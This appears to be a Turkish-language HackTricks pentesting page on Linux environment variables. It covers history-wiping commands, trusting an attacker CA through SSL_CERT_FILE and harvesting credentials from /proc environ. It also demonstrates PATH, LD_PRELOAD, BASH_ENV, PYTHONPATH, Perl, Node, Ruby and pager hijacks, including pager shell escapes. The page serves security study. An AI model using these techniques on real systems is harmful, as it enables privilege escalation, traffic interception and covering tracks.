# Linux Ortam Değişkenleri

{{#include ../../banners/hacktricks-training.md}}

## Global değişkenler

Global değişkenler **alt süreçler** tarafından devralınır.

Geçerli oturumunuz için şu şekilde bir global değişken oluşturabilirsiniz:
```bash
export MYGLOBAL="hello world"
echo $MYGLOBAL #Prints: hello world
```
Bu değişkene mevcut oturumlarınız ve bunların alt süreçleri tarafından erişilebilir.

Bir değişkeni şu şekilde **kaldırabilirsiniz**:
```bash
unset MYGLOBAL
```
## Local variables

**Local variables** yalnızca **mevcut shell/script** tarafından **erişilebilir**.
```bash
LOCAL="my local"
echo $LOCAL
unset LOCAL
```
## Mevcut değişkenleri listeleme
```bash
set
env
printenv
cat /proc/$$/environ
cat /proc/`python -c "import os; print(os.getppid())"`/environ
```
`/proc/*/environ` içerikleri **NUL ile ayrılmıştır**, bu nedenle bu varyantların okunması genellikle daha kolaydır:
```bash
tr '\0' '\n' </proc/$$/environ | sort -u
tr '\0' '\n' </proc/<PID>/environ | sort -u
```
Eğer **credentials** veya devralınan ortamlar içinde **ilginç servis yapılandırmaları** arıyorsanız, ayrıca [Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md) bölümünü de kontrol edin.

## Yaygın değişkenler

Kaynak: [https://geek-university.com/linux/common-environment-variables/](https://geek-university.com/linux/common-environment-variables/)

- **DISPLAY** – **X** tarafından kullanılan ekran. Bu değişken genellikle **:0.0** olarak ayarlanır; bu, mevcut bilgisayardaki ilk ekran anlamına gelir.
- **EDITOR** – kullanıcının tercih ettiği metin editörü.
- **HISTFILESIZE** – history file içinde bulunan maksimum satır sayısı.
- **HISTSIZE** – kullanıcı session'ını sonlandırdığında history file'a eklenen satır sayısı.
- **HOME** – home dizininiz.
- **HOSTNAME** – bilgisayarın hostname'i.
- **LANG** – mevcut diliniz.
- **MAIL** – kullanıcının mail spool konumu. Genellikle **/var/spool/mail/USER**.
- **MANPATH** – manual page'leri aramak için kullanılacak dizinlerin listesi.
- **OSTYPE** – işletim sisteminin türü.
- **PS1** – bash'teki varsayılan prompt.
- **PATH** – çalıştırmak istediğiniz binary dosyaları barındıran tüm dizinlerin yollarını saklar; böylece dosyanın adını belirtmeniz yeterlidir, relative veya absolute path belirtmeniz gerekmez.
- **PWD** – mevcut çalışma dizini.
- **SHELL** – mevcut command shell'in yolu (örneğin, **/bin/bash**).
- **TERM** – mevcut terminal türü (örneğin, **xterm**).
- **TZ** – time zone'unuz.
- **USER** – mevcut kullanıcı adınız.

## Hacking için ilginç değişkenler

Her değişken eşit derecede kullanışlı değildir. Offensive açıdan, **search path'lerini**, **startup file'larını**, **dynamic linker davranışını** veya **audit/logging** süreçlerini değiştiren değişkenlere öncelik verin.

### **HISTFILESIZE**

**Bu değişkenin değerini 0 olarak değiştirin**; böylece **session'ınızı sonlandırdığınızda** **history file** (\~/.bash_history) **0 satıra kısaltılır**.
```bash
export HISTFILESIZE=0
```
### **HISTSIZE**

Komutların **bellek içi geçmişte tutulmaması** ve **geçmiş dosyasına** (\~/.bash_history) geri yazılmaması için **bu değişkenin değerini 0 olarak değiştirin**.
```bash
export HISTSIZE=0
```
### **HISTCONTROL**

**Bu değişkenin değeri `ignorespace` veya `ignoreboth` olarak ayarlanmışsa**, başına fazladan boşluk eklenmiş hiçbir komut geçmişe kaydedilmez.
```bash
export HISTCONTROL=ignorespace
```

```bash
$ echo "to save or"
$  echo "not to save"
```
### **HISTFILE**

**history file**'ı **`/dev/null`**'a yönlendirin veya tamamen unset edin. Bu, yalnızca history size'ı değiştirmekten genellikle daha güvenilirdir.
```bash
export HISTFILE=/dev/null
unset HISTFILE
```
### http_proxy & https_proxy

Process'ler, **http veya https** üzerinden internete bağlanmak için burada tanımlanan **proxy**'yi kullanır.
```bash
export http_proxy="http://10.10.10.10:8080"
export https_proxy="http://10.10.10.10:8080"
```
### all_proxy & no_proxy

- `all_proxy`: bunu destekleyen araçlar/protokoller için varsayılan proxy.
- `no_proxy`: doğrudan bağlanması gereken bypass listesi (host'lar/domain'ler/CIDR'ler).
```bash
export all_proxy="socks5h://10.10.10.10:1080"
export no_proxy="localhost,127.0.0.1,.corp.local,10.0.0.0/8"
```
Hem küçük harfli hem de büyük harfli varyantlar, kullanılan araca bağlı olarak kullanılabilir (`http_proxy`/`HTTP_PROXY`, `no_proxy`/`NO_PROXY`).

### SSL_CERT_FILE & SSL_CERT_DIR

Process'ler, **bu env değişkenlerinde** belirtilen sertifikalara güvenecektir. Bu, **`curl`**, **`git`**, Python HTTP client'ları veya package manager'lar gibi araçların attacker tarafından kontrol edilen bir CA'ya güvenmesini sağlamak için kullanışlıdır (örneğin, bir interception proxy'sinin meşru görünmesini sağlamak için).
```bash
export SSL_CERT_FILE=/path/to/ca-bundle.pem
export SSL_CERT_DIR=/path/to/ca-certificates
```
### **PATH**

Ayrıcalıklı bir wrapper/script komutları **absolute path** kullanmadan çalıştırıyorsa, `PATH` içindeki **saldırgan tarafından kontrol edilen ilk dizin** kazanır. Bu, `sudo`, cron job'ları, shell wrapper'ları ve özel SUID helper'larındaki birçok **PATH hijack** için kullanılan primitive'dir. `env_keep+=PATH`, zayıf `secure_path` veya `tar`, `service`, `cp`, `python` vb. komutları adlarıyla çağıran wrapper'ları arayın.
```bash
mkdir -p /dev/shm/bin
cat > /dev/shm/bin/tar <<'EOF'
#!/bin/sh
echo '[+] PATH hijack reached' >&2
id
EOF
chmod +x /dev/shm/bin/tar
PATH=/dev/shm/bin:$PATH vulnerable-wrapper
```
PATH'i suistimal eden tam privilege-escalation zincirleri için [Linux Privilege Escalation](linux-privilege-escalation/README.md) bölümüne bakın.

### **HOME & XDG_CONFIG_HOME**

`HOME` yalnızca bir dizin referansı değildir: birçok araç **dotfile**'ları, **plugin**'leri ve **kullanıcı başına yapılandırmayı** `$HOME` veya `$XDG_CONFIG_HOME` konumundan otomatik olarak yükler. Privileged bir workflow bu değerleri koruyorsa, **config injection** binary hijacking işleminden daha kolay olabilir.
```bash
export HOME=/dev/shm/fakehome
export XDG_CONFIG_HOME=/dev/shm/fakehome/.config
mkdir -p "$XDG_CONFIG_HOME"
```
İlginç hedefler arasında `.gitconfig`, `.wgetrc`, `.curlrc`, `.inputrc`, `.pythonrc.py` ve `.terraformrc` gibi araca özel dosyalar bulunur.

### **LD_PRELOAD, LD_LIBRARY_PATH & LD_AUDIT**

Bu değişkenler **dynamic linker**'ı etkiler:

- `LD_PRELOAD`: Ek shared object'lerin önce yüklenmesini zorlar.
- `LD_LIBRARY_PATH`: Library arama dizinlerini öne ekler.
- `LD_AUDIT`: Library yüklemesini ve sembol çözümlemesini gözlemleyen auditor library'leri yükler.

Ayrıcalıklı bir komut bunları korursa **hooking**, **instrumentation** ve **privilege escalation** için son derece değerlidirler. **secure-execution** modunda (`AT_SECURE`, ör. setuid/setgid/capabilities) loader, bu değişkenlerin çoğunu kaldırır veya kısıtlar. Ancak bu erken loader aşamasındaki parser hataları, hedef programdan **önce** çalıştıkları için hâlâ yüksek etkiye sahiptir.
```bash
env | grep -E '^LD_'
ldso=$(ls /lib64/ld-linux-*.so.* /lib/*-linux-gnu/ld-linux-*.so.* 2>/dev/null | head -n1)
"$ldso" --list-diagnostics /bin/true | head
"$ldso" --list-tunables /bin/true | head
```
### **GLIBC_TUNABLES**

`GLIBC_TUNABLES`, glibc'nin erken aşamadaki davranışını (örneğin allocator tunable'larını) değiştirir ve exploit lab'lerinde oldukça kullanışlıdır. Ayrıca security açısından da önemlidir; çünkü **dynamic loader bunu çok erken aşamada parse eder**. 2023'teki **Looney Tunables** bug'ı, loader tarafından parse edilen tek bir environment variable'ın SUID programlarına karşı **yerel privilege-escalation primitive'ine** dönüşebileceğini hatırlatan iyi bir örnekti.
```bash
GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./binary
```
### **BASH_ENV & ENV**

**Bash** **interaktif olmayan** şekilde başlatılırsa, hedef script'i çalıştırmadan önce `BASH_ENV` değişkenini kontrol eder ve belirtilen dosyayı source eder. Bash `sh` olarak çağrıldığında veya POSIX tarzı interaktif modda çalıştırıldığında `ENV` de kontrol edilebilir. Bu, environment saldırganın kontrolündeyse bir shell wrapper'ı code execution'a dönüştürmenin klasik bir yoludur.
```bash
cat > /tmp/pre.sh <<'EOF'
echo '[+] sourced before the target script'
EOF
BASH_ENV=/tmp/pre.sh bash -c 'echo target'
```
Bash, `-p` kullanılmadığı sürece **real/effective IDs differ** olduğunda bu startup files'ı kendisi devre dışı bırakır; bu nedenle kesin davranış, wrapper'ın shell'i nasıl çalıştırdığına bağlıdır. Bash'i başlatmadan **önce** `setuid()`/`setgid()` çağıran privileged wrapper'lara dikkat edin: ID'ler yeniden eşleştiğinde Bash, aksi takdirde yok sayacağı `BASH_ENV`, `ENV` ve ilgili shell state'e güvenebilir.

### **PYTHONPATH, PYTHONHOME, PYTHONSTARTUP & PYTHONINSPECT**

Bu değişkenler Python'un nasıl başlatılacağını değiştirir:

- `PYTHONPATH`: Import search path'lerini öne ekler.
- `PYTHONHOME`: Standard library tree'nı yeniden konumlandırır.
- `PYTHONSTARTUP`: Interactive prompt'tan önce bir dosyayı çalıştırır.
- `PYTHONINSPECT=1`: Bir script tamamlandıktan sonra interactive mode'a geçer.

Bunlar, Python'u kontrol edilebilir bir environment ile çağıran maintenance script'lere, debugger'lara, shell'lere ve wrapper'lara karşı kullanışlıdır. `python -E` ve `python -I`, tüm `PYTHON*` değişkenlerini yok sayar.
```bash
mkdir -p /tmp/pylib
printf 'print("owned from PYTHONPATH")\n' > /tmp/pylib/htmod.py
PYTHONPATH=/tmp/pylib python3 -c 'import htmod'
PYTHONPATH=/tmp/pylib python3 -I -c 'import htmod'   # ignored in isolated mode
```
Yakın zamanda gerçek dünyadan bir örnek, Ubuntu/Debian sistemlerindeki 2024 **needrestart** LPE'siydi: root-owned scanner, ayrıcalıksız bir process'in `PYTHONPATH` değerini `/proc/<PID>/environ` üzerinden kopyalıyor ve ardından Python'ı çalıştırıyordu. Yayınlanan exploit, saldırganın kontrolündeki path'e `importlib/__init__.so` yerleştirerek Python'ın kendi initialization sürecinde, helper'ın hard-coded script'i önem kazanmadan önce saldırgan kodunu çalıştırıyordu.

### **PERL5OPT & PERL5LIB**

Perl'in de benzer şekilde kullanışlı startup değişkenleri vardır:

- `PERL5LIB`: library dizinlerini prepend eder.
- `PERL5OPT`: switch'leri her `perl` command line'ında yer alıyormuş gibi inject eder.

Bu, **automatic module loading** işlemini zorlayabilir veya target script ilginç bir şey yapmadan önce interpreter davranışını değiştirebilir. Perl, **taint / setuid / setgid** context'lerinde bu değişkenleri yok sayar; ancak normal root-run wrapper'lar, CI job'ları, installer'lar ve özel sudoers kuralları için hâlâ oldukça önemlidir.
```bash
mkdir -p /tmp/perllib
cat > /tmp/perllib/HT.pm <<'EOF'
package HT;
BEGIN { print "PERL5OPT_TRIGGERED\n" }
1;
EOF
PERL5LIB=/tmp/perllib PERL5OPT=-MHT perl -e 'print "target\n"'
```
### **NODE_OPTIONS**

`NODE_OPTIONS`, ortamı devralan her `node` process'ine **Node.js CLI flags** ekler. Bu özellik, sonunda Node çağıran wrapper'lara, CI job'larına, Electron helper'larına ve sudo kurallarına karşı kullanılmasını sağlar. Saldırı açısından en ilgi çekici flag'ler genellikle şunlardır:

- `--require <file>`: hedef script'ten önce bir CommonJS dosyasını preload eder.
- `--import <module>`: hedef script'ten önce bir ES module'ü preload eder.

Node, bazı tehlikeli flag'lerin `NODE_OPTIONS` içinde kullanılmasını reddeder; ancak `--require` ve `--import` açıkça izin verilen flag'lerdir ve normal command-line arguments'tan **önce** işlenir.
```bash
cat > /tmp/preload.js <<'EOF'
console.error('[+] NODE_OPTIONS preload reached')
EOF
NODE_OPTIONS='--require /tmp/preload.js' node -e 'console.log("target")'
```
`NODE_OPTIONS` değerini dolaylı olarak ayarlayan remote gadget chain'ler için (örneğin prototype-pollution ile RCE), [bu diğer sayfaya](../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.md) bakın.

### **RUBYLIB & RUBYOPT**

Ruby, startup abuse için aynı sınıfı sunar:

- `RUBYLIB`: Ruby'nin load path'ine dizinleri öne ekler.
- `RUBYOPT`: Her `ruby` çalıştırmasına `-r` gibi command-line seçeneklerini enjekte eder.
```bash
mkdir -p /tmp/rubylib
printf 'warn "[+] RUBYOPT preload reached"\n' > /tmp/rubylib/ht.rb
RUBYLIB=/tmp/rubylib RUBYOPT='-rht' ruby -e 'puts :target'
```
2024 **needrestart** vulnerabilities, bunun yalnızca bir lab trick olmadığını gösterdi: `PYTHONPATH` abuse'a karşı vulnerable olan aynı root-owned helper, attacker-controlled bir `RUBYLIB` ile Ruby çalıştırmaya ve attacker directory içindeki `enc/encdb.so` dosyasını load etmeye de zorlanabiliyordu.

### **PAGER, MANPAGER, GIT_PAGER, GIT_EDITOR & LESSOPEN**

Bazı tools yalnızca environment'dan bir path okumaz; değeri bir **shell**'e, bir **editor**'e veya bir **input preprocessor**'a iletir. Bu nedenle privileged bir wrapper `git`, `man`, `less` veya benzer text viewer'larını çalıştırdığında aşağıdaki variables özellikle ilgi çekicidir:

- `PAGER`, `MANPAGER`, `GIT_PAGER`: pager command'ını seçer.
- `GIT_EDITOR`, `VISUAL`, `EDITOR`: editor command'ını, çoğu zaman arguments ile birlikte seçer.
- `LESSOPEN`, `LESSCLOSE`: `less` bir file açtığında çalışan pre/post-processor'ları tanımlar.
```bash
PAGER='sh -c "exec sh 0<&1 1>&1"' man man

cat > /tmp/lesspipe.sh <<'EOF'
#!/bin/sh
echo '[+] LESSOPEN triggered' >&2
cat "$1"
EOF
chmod +x /tmp/lesspipe.sh
LESSOPEN='|/tmp/lesspipe.sh %s' less /etc/hosts
```
Git ayrıca `GIT_CONFIG_COUNT`, `GIT_CONFIG_KEY_<n>` ve `GIT_CONFIG_VALUE_<n>` aracılığıyla diske dokunmadan **yalnızca ortam değişkenleriyle config enjeksiyonunu** destekler:
```bash
GIT_CONFIG_COUNT=1 \
GIT_CONFIG_KEY_0=core.pager \
GIT_CONFIG_VALUE_0='sh -c "exec sh 0<&1 1>&1"' \
git -p help
```
Post-exploitation perspektifinden, devralınan ortamların genellikle **credentials**, **proxy settings**, **service tokens** veya **cloud keys** içerdiğini de unutmayın. `/proc/<PID>/environ` ve `systemd` `Environment=` hunting için [Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md) sayfasına bakın.

### PS1

Prompt'unuzun görünümünü değiştirin.

[**Bu bir örnektir**](https://gist.github.com/carlospolop/43f7cd50f3deea972439af3222b68808)

Kök:

![PERL5OPT & PERL5LIB - PS1: Bu bir örnektir](<../images/image (897).png>)

Normal kullanıcı:

![PERL5OPT & PERL5LIB - PS1: Arka plana alınmış bir, iki ve üç job](<../images/image (740).png>)

Arka plana alınmış bir, iki ve üç job:

![PERL5OPT & PERL5LIB - PS1: Arka plana alınmış bir, iki ve üç job](<../images/image (145).png>)

Bir background job, biri stopped ve son command doğru şekilde tamamlanmadı:

![PERL5OPT & PERL5LIB - PS1: Bir background job, biri stopped ve son command doğru şekilde tamamlanmadı](<../images/image (715).png>)

## Referanslar

- [GNU Bash Manual - Bash Startup Files](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)
- [ld.so(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [Qualys - LPEs in needrestart](https://www.qualys.com/2024/11/19/needrestart/needrestart.txt)
- [Node.js CLI documentation - `NODE_OPTIONS`](https://nodejs.org/api/cli.html)

{{#include ../../banners/hacktricks-training.md}}
